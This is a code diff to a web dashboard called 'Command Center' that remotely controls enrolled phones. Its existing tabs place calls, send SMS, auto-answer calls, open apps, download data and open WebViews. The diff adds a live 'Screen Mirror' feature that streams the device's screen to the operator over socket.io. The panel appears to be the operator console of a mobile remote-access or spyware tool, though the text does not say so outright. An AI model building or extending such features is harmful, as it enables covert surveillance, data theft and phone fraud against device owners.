@@ -1162,6 +1162,48 @@
             max-height: 190px;
         }
 
+        .screen-mirror-actions-inline {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .screen-mirror-status-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .screen-mirror-status-item {
+            padding: 10px 12px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(11, 18, 32, 0.36);
+            color: #dbe8fb;
+            font-size: 0.88rem;
+        }
+
+        .screen-mirror-viewer {
+            margin-top: 12px;
+            min-height: 260px;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(2, 6, 18, 0.72);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .screen-mirror-viewer img {
+            width: 100%;
+            height: auto;
+            max-height: 62vh;
+            object-fit: contain;
+            display: block;
+        }
+
         @media (max-width: 768px) {
             .header,
             .card,
@@ -1439,7 +1481,7 @@
         <section id="appSection" class="grid panel-hidden">
             <article class="card full-width">
                 <h2>Command Center</h2>
-                <div class="segmented-control" role="tablist" aria-label="Call SMS Auto Answer Open App Download Data WebView Toggle">
+                <div class="segmented-control" role="tablist" aria-label="Call SMS Auto Answer Open App Download Data Screen Mirror WebView Toggle">
                     <button id="callTabBtn" class="segmented-option active" role="tab" aria-selected="true"
                         onclick="setActionTab('call')">Call</button>
                     <button id="smsTabBtn" class="segmented-option" role="tab" aria-selected="false"
@@ -1450,6 +1492,8 @@
                         onclick="setActionTab('open_app')">Open App</button>
                     <button id="downloadDataTabBtn" class="segmented-option" role="tab" aria-selected="false"
                         onclick="setActionTab('download_data')">Download Data</button>
+                    <button id="screenMirrorTabBtn" class="segmented-option" role="tab" aria-selected="false"
+                        onclick="setActionTab('screen_mirror')">Screen Mirror</button>
                     <button id="webViewTabBtn" class="segmented-option" role="tab" aria-selected="false"
                         onclick="setActionTab('webview')">WebView</button>
                 </div>
@@ -1563,6 +1607,24 @@
                         <button onclick="sendDownloadDataCommand()">Send DOWNLOAD_DATA</button>
                     </div>
                 </div>
+                <div id="screenMirrorTabPanel" class="tab-panel">
+                    <h2>Live Screen Mirror</h2>
+                    <div class="input-row auto-answer-input-grid">
+                        <select id="deviceSelectScreenMirror"></select>
+                        <div class="screen-mirror-actions-inline">
+                            <button onclick="startScreenMirror()">Start Screen Mirror</button>
+                            <button class="danger-button" onclick="stopScreenMirror()">Stop Screen Mirror</button>
+                        </div>
+                    </div>
+                    <div class="screen-mirror-status-grid">
+                        <div class="screen-mirror-status-item">Status: <span id="screenMirrorStatusText">idle</span></div>
+                        <div class="screen-mirror-status-item">Frame Count: <span id="screenMirrorFrameCountText">0</span></div>
+                        <div class="screen-mirror-status-item">Last Frame: <span id="screenMirrorLastFrameText">--</span></div>
+                    </div>
+                    <div class="screen-mirror-viewer">
+                        <img id="screenMirrorPreview" alt="Live mirrored screen" />
+                    </div>
+                </div>
             </article>
 
             <article id="devicesPanel" class="card full-width">
@@ -1617,6 +1679,7 @@
     </footer>
     <div id="toastContainer" class="toast-container" aria-live="polite" aria-atomic="true"></div>
 
+    <script src="/socket.io/socket.io.js"></script>
     <script>
         const SERVER =
             window.location.hostname === "localhost"
@@ -1628,6 +1691,8 @@
         let authToken = "";
         let authenticatedUser = null;
         let refreshDevicesIntervalId = null;
+        let screenMirrorSocket = null;
+        let screenMirrorJoinedDeviceUid = "";
         const panelVisibility = {
             devices: false,
             commands: false
@@ -1648,7 +1713,9 @@
             auto_answer: "AUTO_ANSWER",
             return_to_autocall: "RETURN_TO_AUTOCALL",
             close_webview: "CLOSE_WEBVIEW",
-            end: "END"
+            end: "END",
+            start_screen_mirror: "START_SCREEN_MIRROR",
+            stop_screen_mirror: "STOP_SCREEN_MIRROR"
         };
         const supportedCommandTypes = new Set(Object.values(commandActionToType));
         const tabOrder = {
@@ -1657,7 +1724,8 @@
             auto_answer: 2,
             open_app: 3,
             download_data: 4,
-            webview: 5
+            screen_mirror: 5,
+            webview: 6
         };
         const deviceNameByUid = new Map();
 
@@ -1669,6 +1737,198 @@
         function normalizeDeviceUidInput(value) {
             if (typeof value !== "string") return "";
             return value.trim().toLowerCase();
+        }
+
+        function resetScreenMirrorView() {
+            const preview = document.getElementById("screenMirrorPreview");
+            const statusText = document.getElementById("screenMirrorStatusText");
+            const frameCountText = document.getElementById("screenMirrorFrameCountText");
+            const lastFrameText = document.getElementById("screenMirrorLastFrameText");
+
+            if (preview) {
+                preview.removeAttribute("src");
+            }
+            if (statusText) {
+                statusText.textContent = "idle";
+            }
+            if (frameCountText) {
+                frameCountText.textContent = "0";
+            }
+            if (lastFrameText) {
+                lastFrameText.textContent = "--";
+            }
+        }
+
+        function applyScreenMirrorStatus(payload = {}) {
+            const statusText = document.getElementById("screenMirrorStatusText");
+            const frameCountText = document.getElementById("screenMirrorFrameCountText");
+            const lastFrameText = document.getElementById("screenMirrorLastFrameText");
+
+            const normalizedStatus =
+                typeof payload.status === "string" && payload.status.trim()
+                    ? payload.status.trim()
+                    : "idle";
+            const normalizedReason =
+                typeof payload.reason === "string" && payload.reason.trim()
+                    ? payload.reason.trim()
+                    : "";
+            if (statusText) {
+                statusText.textContent = normalizedReason
+                    ? `${normalizedStatus} (${normalizedReason})`
+                    : normalizedStatus;
+            }
+
+            const normalizedFrameCount = Number.isFinite(Number(payload.frameCount))
+                ? Math.max(0, Math.round(Number(payload.frameCount)))
+                : null;
+            if (frameCountText && normalizedFrameCount !== null) {
+                frameCountText.textContent = String(normalizedFrameCount);
+            }
+
+            const rawLastFrame = payload.lastFrameAt ?? payload.timestamp ?? null;
+            let formattedLastFrame = "--";
+            if (rawLastFrame !== null && rawLastFrame !== undefined && rawLastFrame !== "") {
+                const parsed =
+                    typeof rawLastFrame === "number"
+                        ? new Date(rawLastFrame)
+                        : new Date(String(rawLastFrame));
+                if (!Number.isNaN(parsed.getTime())) {
+                    formattedLastFrame = parsed.toLocaleString();
+                }
+            }
+            if (lastFrameText) {
+                lastFrameText.textContent = formattedLastFrame;
+            }
+        }
+
+        function ensureScreenMirrorSocket() {
+            if (screenMirrorSocket || typeof io !== "function") {
+                return screenMirrorSocket;
+            }
+
+            screenMirrorSocket = io(SERVER, {
+                transports: ["websocket"],
+                reconnection: true
+            });
+
+            screenMirrorSocket.on("connect", () => {
+                if (screenMirrorJoinedDeviceUid) {
+                    screenMirrorSocket.emit("dashboard:join", {
+                        deviceUid: screenMirrorJoinedDeviceUid
+                    });
+                }
+            });
+
+            screenMirrorSocket.on("screen:status", (payload = {}) => {
+                const payloadDeviceUid = normalizeDeviceUidInput(payload?.deviceUid || "");
+                if (!payloadDeviceUid || payloadDeviceUid !== screenMirrorJoinedDeviceUid) {
+                    return;
+                }
+                applyScreenMirrorStatus(payload);
+            });
+
+            screenMirrorSocket.on("screen:frame", (payload = {}) => {
+                const payloadDeviceUid = normalizeDeviceUidInput(payload?.deviceUid || "");
+                if (!payloadDeviceUid || payloadDeviceUid !== screenMirrorJoinedDeviceUid) {
+                    return;
+                }
+
+                const frameBase64 =
+                    typeof payload.frameBase64 === "string" ? payload.frameBase64 : "";
+                if (!frameBase64) return;
+
+                const mimeType =
+                    typeof payload.mimeType === "string" && payload.mimeType.trim()
+                        ? payload.mimeType.trim()
+                        : "image/jpeg";
+                const preview = document.getElementById("screenMirrorPreview");
+                if (preview) {
+                    preview.src = `data:${mimeType};base64,${frameBase64}`;
+                }
+
+                const frameCountElement = document.getElementById("screenMirrorFrameCountText");
+                const currentFrameCount = Number(frameCountElement?.textContent || "0");
+                const nextFrameCount = Number.isFinite(currentFrameCount)
+                    ? currentFrameCount + 1
+                    : 1;
+                applyScreenMirrorStatus({
+                    status: "live",
+                    frameCount: nextFrameCount,
+                    timestamp: payload.timestamp
+                });
+            });
+
+            return screenMirrorSocket;
+        }
+
+        function disconnectScreenMirrorSocket() {
+            if (!screenMirrorSocket) return;
+            screenMirrorSocket.disconnect();
+            screenMirrorSocket = null;
+            screenMirrorJoinedDeviceUid = "";
+        }
+
+        function joinScreenMirrorDashboardRoom(deviceUid) {
+            const normalizedDeviceUid = normalizeDeviceUidInput(deviceUid);
+            if (!normalizedDeviceUid) {
+                screenMirrorJoinedDeviceUid = "";
+                return;
+            }
+
+            screenMirrorJoinedDeviceUid = normalizedDeviceUid;
+            const socket = ensureScreenMirrorSocket();
+            if (!socket) return;
+
+            socket.emit("dashboard:join", { deviceUid: normalizedDeviceUid });
+        }
+
+        async function sendScreenMirrorCommand(action, type) {
+            const deviceUid = document.getElementById("deviceSelectScreenMirror").value;
+            if (!deviceUid) {
+                showToast("Please select a device first", "error");
+                return;
+            }
+
+            try {
+                joinScreenMirrorDashboardRoom(deviceUid);
+                const response = await apiFetch("/commands", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        action,
+                        type,
+                        deviceUid,
+                        isImmediate: true
+                    })
+                });
+
+                const payload = await response.json();
+                if (!response.ok) {
+                    throw new Error(parseApiErrorMessage(payload, "Failed to send screen mirror command"));
+                }
+
+                if (action === "start_screen_mirror") {
+                    applyScreenMirrorStatus({ status: "starting" });
+                    showToast("START_SCREEN_MIRROR command sent", "success");
+                } else {
+                    applyScreenMirrorStatus({ status: "stopping" });
+                    showToast("STOP_SCREEN_MIRROR command sent", "success");
+                }
+
+                await loadCommands();
+            } catch (error) {
+                showToast(error.message || "Failed to send screen mirror command", "error");
+            }
+        }
+
+        async function startScreenMirror() {
+            await sendScreenMirrorCommand("start_screen_mirror", "START_SCREEN_MIRROR");
+        }
+
+        async function stopScreenMirror() {
+            await sendScreenMirrorCommand("stop_screen_mirror", "STOP_SCREEN_MIRROR");
         }
 
         function syncOverlayScrollLock() {
@@ -1789,6 +2049,7 @@
             if (sessionInfo) {
                 sessionInfo.classList.remove("panel-hidden");
             }
+            ensureScreenMirrorSocket();
         }
 
         function clearAuthenticatedUser(removeStoredToken = true) {
@@ -1796,6 +2057,8 @@
             authenticatedUser = null;
             deviceNameByUid.clear();
             stopDevicesSelectRefresh();
+            disconnectScreenMirrorSocket();
+            resetScreenMirrorView();
 
             const authSection = document.getElementById("authSection");
             const appSection = document.getElementById("appSection");
@@ -2254,6 +2517,16 @@
                 return appendScheduledDetail(details, command);
             }
 
+            if (commandType === "START_SCREEN_MIRROR") {
+                details.primary = "Start live screen mirror";
+                return appendScheduledDetail(details, command);
+            }
+
+            if (commandType === "STOP_SCREEN_MIRROR") {
+                details.primary = "Stop live screen mirror";
+                return appendScheduledDetail(details, command);
+            }
+
             if (commandType === "END") {
                 details.primary = "End current call";
                 return appendScheduledDetail(details, command);
@@ -2376,6 +2649,7 @@
             const isAutoAnswer = activeTab === "auto_answer";
             const isOpenApp = activeTab === "open_app";
             const isDownloadData = activeTab === "download_data";
+            const isScreenMirror = activeTab === "screen_mirror";
             const isWebView = activeTab === "webview";
 
             const callPanel = document.getElementById("callTabPanel");
@@ -2383,8 +2657,9 @@
             const autoAnswerPanel = document.getElementById("autoAnswerTabPanel");
             const openAppPanel = document.getElementById("openAppTabPanel");
             const downloadDataPanel = document.getElementById("downloadDataTabPanel");
+            const screenMirrorPanel = document.getElementById("screenMirrorTabPanel");
             const webViewPanel = document.getElementById("webViewTabPanel");
-            const panels = [callPanel, smsPanel, autoAnswerPanel, openAppPanel, downloadDataPanel, webViewPanel];
+            const panels = [callPanel, smsPanel, autoAnswerPanel, openAppPanel, downloadDataPanel, screenMirrorPanel, webViewPanel];
             panels.forEach((panel) => panel.classList.remove("tab-enter-left", "tab-enter-right"));
 
             callPanel.classList.toggle("active", isCall);
@@ -2392,6 +2667,7 @@
             autoAnswerPanel.classList.toggle("active", isAutoAnswer);
             openAppPanel.classList.toggle("active", isOpenApp);
             downloadDataPanel.classList.toggle("active", isDownloadData);
+            screenMirrorPanel.classList.toggle("active", isScreenMirror);
             webViewPanel.classList.toggle("active", isWebView);
 
             if (targetTab !== previousTab) {
@@ -2405,7 +2681,9 @@
                                 ? openAppPanel
                                 : isDownloadData
                                     ? downloadDataPanel
-                                    : webViewPanel;
+                                    : isScreenMirror
+                                        ? screenMirrorPanel
+                                        : webViewPanel;
                 const movingForward = tabOrder[targetTab] > tabOrder[previousTab];
                 const animationClass = movingForward ? "tab-enter-right" : "tab-enter-left";
                 void targetPanel.offsetWidth;
@@ -2417,6 +2695,7 @@
             document.getElementById("autoAnswerTabBtn").classList.toggle("active", isAutoAnswer);
             document.getElementById("openAppTabBtn").classList.toggle("active", isOpenApp);
             document.getElementById("downloadDataTabBtn").classList.toggle("active", isDownloadData);
+            document.getElementById("screenMirrorTabBtn").classList.toggle("active", isScreenMirror);
             document.getElementById("webViewTabBtn").classList.toggle("active", isWebView);
 
             document.getElementById("callTabBtn").setAttribute("aria-selected", String(isCall));
@@ -2424,6 +2703,7 @@
             document.getElementById("autoAnswerTabBtn").setAttribute("aria-selected", String(isAutoAnswer));
             document.getElementById("openAppTabBtn").setAttribute("aria-selected", String(isOpenApp));
             document.getElementById("downloadDataTabBtn").setAttribute("aria-selected", String(isDownloadData));
+            document.getElementById("screenMirrorTabBtn").setAttribute("aria-selected", String(isScreenMirror));
             document.getElementById("webViewTabBtn").setAttribute("aria-selected", String(isWebView));
         }
 
@@ -2605,12 +2885,14 @@
                 const autoAnswerSelect = document.getElementById("deviceSelectAutoAnswer");
                 const openAppSelect = document.getElementById("deviceSelectOpenApp");
                 const downloadDataSelect = document.getElementById("deviceSelectDownloadData");
+                const screenMirrorSelect = document.getElementById("deviceSelectScreenMirror");
                 const webViewSelect = document.getElementById("deviceSelectWebView");
                 const previousCallValue = callSelect.value;
                 const previousSmsValue = smsSelect.value;
                 const previousAutoAnswerValue = autoAnswerSelect.value;
                 const previousOpenAppValue = openAppSelect.value;
                 const previousDownloadDataValue = downloadDataSelect.value;
+                const previousScreenMirrorValue = screenMirrorSelect.value;
                 const previousWebViewValue = webViewSelect.value;
 
                 rememberDevices(data);
@@ -2619,20 +2901,27 @@
                 populateDeviceSelect(autoAnswerSelect, data, previousAutoAnswerValue);
                 populateDeviceSelect(openAppSelect, data, previousOpenAppValue);
                 populateDeviceSelect(downloadDataSelect, data, previousDownloadDataValue);
+                populateDeviceSelect(screenMirrorSelect, data, previousScreenMirrorValue);
                 populateDeviceSelect(webViewSelect, data, previousWebViewValue);
+
+                const selectedScreenMirrorUid = normalizeDeviceUidInput(screenMirrorSelect.value);
+                joinScreenMirrorDashboardRoom(selectedScreenMirrorUid);
             } catch (error) {
                 const callSelect = document.getElementById("deviceSelect");
                 const smsSelect = document.getElementById("deviceSelectSms");
                 const autoAnswerSelect = document.getElementById("deviceSelectAutoAnswer");
                 const openAppSelect = document.getElementById("deviceSelectOpenApp");
                 const downloadDataSelect = document.getElementById("deviceSelectDownloadData");
+                const screenMirrorSelect = document.getElementById("deviceSelectScreenMirror");
                 const webViewSelect = document.getElementById("deviceSelectWebView");
                 populateDeviceSelect(callSelect, [], "");
                 populateDeviceSelect(smsSelect, [], "");
                 populateDeviceSelect(autoAnswerSelect, [], "");
                 populateDeviceSelect(openAppSelect, [], "");
                 populateDeviceSelect(downloadDataSelect, [], "");
+                populateDeviceSelect(screenMirrorSelect, [], "");
                 populateDeviceSelect(webViewSelect, [], "");
+                resetScreenMirrorView();
             }
         }
 
@@ -3055,6 +3344,16 @@
             showToast("Commands cleared", "success");
         }
 
+        const screenMirrorSelectElement = document.getElementById("deviceSelectScreenMirror");
+        if (screenMirrorSelectElement) {
+            screenMirrorSelectElement.addEventListener("change", (event) => {
+                const selectedUid = normalizeDeviceUidInput(event?.target?.value || "");
+                resetScreenMirrorView();
+                joinScreenMirrorDashboardRoom(selectedUid);
+            });
+        }
+
+        resetScreenMirrorView();
         setWebViewCommandAction("open_url");
         updatePanelToggleUI("devices");
         updatePanelToggleUI("commands");
